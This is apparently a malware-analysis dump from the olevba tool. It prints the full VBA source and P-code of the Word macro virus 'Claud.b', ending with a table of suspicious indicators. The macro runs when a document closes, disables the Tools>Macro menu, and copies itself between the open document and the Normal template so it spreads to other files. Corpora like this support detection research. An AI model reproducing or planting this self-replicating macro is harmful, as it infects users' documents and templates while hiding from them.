@@ -1,0 +1,325 @@
+olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
+===============================================================================
+FILE: ./Virus.MSWord.Claud.b
+Type: OLE
+-------------------------------------------------------------------------------
+VBA MACRO Claudio2.cls 
+in file: ./Virus.MSWord.Claud.b - OLE stream: 'Macros/VBA/Claudio2'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Private Sub Document_close()
+On Error Resume Next
+Dim jota As Integer, i As Integer, y As Integer, cadecodi As String
+ Set AD = ActiveDocument.VBProject.VBComponents.Item(1)
+ Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
+  CommandBars("tools").Controls("macro").Enabled = False
+  Options.VirusProtection = True
+  y = 0
+  If AD.Name = "Claudio2" Then GoTo InfectNormal
+  i = nt.CodeModule.ProcBodyLine("Document_Close", vbext_pk_Proc)
+Claudio:
+  jota = 0
+  jota = AD.CodeModule.ProcBodyLine("Document_Close", vbext_pk_Proc)
+  If jota = 0 Then
+   jota = i
+   Do While y < nt.CodeModule.ProcCountLines("Document_Close", vbext_pk_Proc)
+     y = y + 1
+     cadecodi = nt.CodeModule.Lines(jota, 1)
+     AD.CodeModule.InsertLines y, cadecodi
+     jota = jota + 1
+   Loop
+   AD.Name = "Claudio2"
+   ActiveDocument.SaveAs ActiveDocument.FullName
+  Else
+    AD.CodeModule.ReplaceLine jota, "Sub Claudio"
+    GoTo Claudio
+  End If
+ GoTo IYGH
+InfectNormal:
+If nt.Name <> "Claudio2" Then
+i = AD.CodeModule.ProcBodyLine("Document_Close", vbext_pk_Proc)
+jota = 0
+jota = nt.CodeModule.ProcBodyLine("Document_Close", vbext_pk_Proc)
+  If jota = 0 Then
+   jota = i
+   Do While y < AD.CodeModule.ProcCountLines("Document_Close", vbext_pk_Proc)
+     y = y + 1
+     cadecodi = AD.CodeModule.Lines(jota, 1)
+     nt.CodeModule.InsertLines y, cadecodi
+     jota = jota + 1
+   Loop
+   nt.Name = "Claudio2"
+   NormalTemplate.Save
+  Else
+    nt.CodeModule.ReplaceLine jota, "Sub Claudio"
+    GoTo InfectNormal
+  End If
+ End If
+IYGH:
+'Este es un V macro, Elaborado por c l a u d I o
+'Este es el Comienzo de la era de los V Claudio
+End Sub
+
+
+
+-------------------------------------------------------------------------------
+VBA MACRO VBA_P-code.txt 
+in file: VBA P-code - OLE stream: 'VBA P-code'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+' Processing file: ./Virus.MSWord.Claud.b
+' ===============================================================================
+' Module streams:
+' Macros/VBA/Claudio2 - 3864 bytes
+' Line #0:
+' 	FuncDefn (Private Sub Document_close())
+' Line #1:
+' 	OnError (Resume Next) 
+' Line #2:
+' 	Dim 
+' 	VarDefn jota (As Integer)
+' 	VarDefn i (As Integer)
+' 	VarDefn y (As Integer)
+' 	VarDefn cadecodi (As String)
+' Line #3:
+' 	SetStmt 
+' 	LitDI2 0x0001 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	MemLd VBComponents 
+' 	ArgsMemLd Item 0x0001 
+' 	Set AD 
+' Line #4:
+' 	SetStmt 
+' 	LitDI2 0x0001 
+' 	Ld NormalTemplate 
+' 	MemLd VBProject 
+' 	MemLd VBComponents 
+' 	ArgsMemLd Item 0x0001 
+' 	Set nt 
+' Line #5:
+' 	LitVarSpecial (False)
+' 	LitStr 0x0005 "macro"
+' 	LitStr 0x0005 "tools"
+' 	ArgsLd CommandBars 0x0001 
+' 	ArgsMemLd Controls 0x0001 
+' 	MemSt Enabled 
+' Line #6:
+' 	LitVarSpecial (True)
+' 	Ld Options 
+' 	MemSt VirusProtection 
+' Line #7:
+' 	LitDI2 0x0000 
+' 	St y 
+' Line #8:
+' 	Ld AD 
+' 	MemLd New 
+' 	LitStr 0x0008 "Claudio2"
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	GoTo InfectNormal 
+' 	EndIf 
+' Line #9:
+' 	LitStr 0x000E "Document_Close"
+' 	Ld vbext_pk_Proc 
+' 	Ld nt 
+' 	MemLd CodeModule 
+' 	ArgsMemLd ProcBodyLine 0x0002 
+' 	St i 
+' Line #10:
+' 	Label Claudio 
+' Line #11:
+' 	LitDI2 0x0000 
+' 	St jota 
+' Line #12:
+' 	LitStr 0x000E "Document_Close"
+' 	Ld vbext_pk_Proc 
+' 	Ld AD 
+' 	MemLd CodeModule 
+' 	ArgsMemLd ProcBodyLine 0x0002 
+' 	St jota 
+' Line #13:
+' 	Ld jota 
+' 	LitDI2 0x0000 
+' 	Eq 
+' 	IfBlock 
+' Line #14:
+' 	Ld i 
+' 	St jota 
+' Line #15:
+' 	Ld y 
+' 	LitStr 0x000E "Document_Close"
+' 	Ld vbext_pk_Proc 
+' 	Ld nt 
+' 	MemLd CodeModule 
+' 	ArgsMemLd ProcCountLines 0x0002 
+' 	Lt 
+' 	DoWhile 
+' Line #16:
+' 	Ld y 
+' 	LitDI2 0x0001 
+' 	Add 
+' 	St y 
+' Line #17:
+' 	Ld jota 
+' 	LitDI2 0x0001 
+' 	Ld nt 
+' 	MemLd CodeModule 
+' 	ArgsMemLd Lines 0x0002 
+' 	St cadecodi 
+' Line #18:
+' 	Ld y 
+' 	Ld cadecodi 
+' 	Ld AD 
+' 	MemLd CodeModule 
+' 	ArgsMemCall InsertLines 0x0002 
+' Line #19:
+' 	Ld jota 
+' 	LitDI2 0x0001 
+' 	Add 
+' 	St jota 
+' Line #20:
+' 	Loop 
+' Line #21:
+' 	LitStr 0x0008 "Claudio2"
+' 	Ld AD 
+' 	MemSt New 
+' Line #22:
+' 	Ld ActiveDocument 
+' 	MemLd FullName 
+' 	Ld ActiveDocument 
+' 	ArgsMemCall SaveAs 0x0001 
+' Line #23:
+' 	ElseBlock 
+' Line #24:
+' 	Ld jota 
+' 	LitStr 0x000B "Sub Claudio"
+' 	Ld AD 
+' 	MemLd CodeModule 
+' 	ArgsMemCall ReplaceLine 0x0002 
+' Line #25:
+' 	GoTo Claudio 
+' Line #26:
+' 	EndIfBlock 
+' Line #27:
+' 	GoTo IYGH 
+' Line #28:
+' 	Label InfectNormal 
+' Line #29:
+' 	Ld nt 
+' 	MemLd New 
+' 	LitStr 0x0008 "Claudio2"
+' 	Ne 
+' 	IfBlock 
+' Line #30:
+' 	LitStr 0x000E "Document_Close"
+' 	Ld vbext_pk_Proc 
+' 	Ld AD 
+' 	MemLd CodeModule 
+' 	ArgsMemLd ProcBodyLine 0x0002 
+' 	St i 
+' Line #31:
+' 	LitDI2 0x0000 
+' 	St jota 
+' Line #32:
+' 	LitStr 0x000E "Document_Close"
+' 	Ld vbext_pk_Proc 
+' 	Ld nt 
+' 	MemLd CodeModule 
+' 	ArgsMemLd ProcBodyLine 0x0002 
+' 	St jota 
+' Line #33:
+' 	Ld jota 
+' 	LitDI2 0x0000 
+' 	Eq 
+' 	IfBlock 
+' Line #34:
+' 	Ld i 
+' 	St jota 
+' Line #35:
+' 	Ld y 
+' 	LitStr 0x000E "Document_Close"
+' 	Ld vbext_pk_Proc 
+' 	Ld AD 
+' 	MemLd CodeModule 
+' 	ArgsMemLd ProcCountLines 0x0002 
+' 	Lt 
+' 	DoWhile 
+' Line #36:
+' 	Ld y 
+' 	LitDI2 0x0001 
+' 	Add 
+' 	St y 
+' Line #37:
+' 	Ld jota 
+' 	LitDI2 0x0001 
+' 	Ld AD 
+' 	MemLd CodeModule 
+' 	ArgsMemLd Lines 0x0002 
+' 	St cadecodi 
+' Line #38:
+' 	Ld y 
+' 	Ld cadecodi 
+' 	Ld nt 
+' 	MemLd CodeModule 
+' 	ArgsMemCall InsertLines 0x0002 
+' Line #39:
+' 	Ld jota 
+' 	LitDI2 0x0001 
+' 	Add 
+' 	St jota 
+' Line #40:
+' 	Loop 
+' Line #41:
+' 	LitStr 0x0008 "Claudio2"
+' 	Ld nt 
+' 	MemSt New 
+' Line #42:
+' 	Ld NormalTemplate 
+' 	ArgsMemCall Save 0x0000 
+' Line #43:
+' 	ElseBlock 
+' Line #44:
+' 	Ld jota 
+' 	LitStr 0x000B "Sub Claudio"
+' 	Ld nt 
+' 	MemLd CodeModule 
+' 	ArgsMemCall ReplaceLine 0x0002 
+' Line #45:
+' 	GoTo InfectNormal 
+' Line #46:
+' 	EndIfBlock 
+' Line #47:
+' 	EndIfBlock 
+' Line #48:
+' 	Label IYGH 
+' Line #49:
+' 	QuoteRem 0x0000 0x002F "Este es un V macro, Elaborado por c l a u d I o"
+' Line #50:
+' 	QuoteRem 0x0000 0x002E "Este es el Comienzo de la era de los V Claudio"
+' Line #51:
+' 	EndSub 
+' Line #52:
+' Line #53:
+' Line #54:
++----------+--------------------+---------------------------------------------+
+|Type      |Keyword             |Description                                  |
++----------+--------------------+---------------------------------------------+
+|AutoExec  |Document_close      |Runs when the Word document is closed        |
+|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
+|          |                    |modification)                                |
+|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
+|          |                    |modification)                                |
+|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
+|          |                    |modification)                                |
+|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
+|          |                    |used to obfuscate strings (option --decode to|
+|          |                    |see all)                                     |
+|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
+|          |                    |used to obfuscate strings (option --decode to|
+|          |                    |see all)                                     |
+|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
+|          |                    |code and P-code are different, this may have |
+|          |                    |been used to hide malicious code             |
++----------+--------------------+---------------------------------------------+
+VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues
+
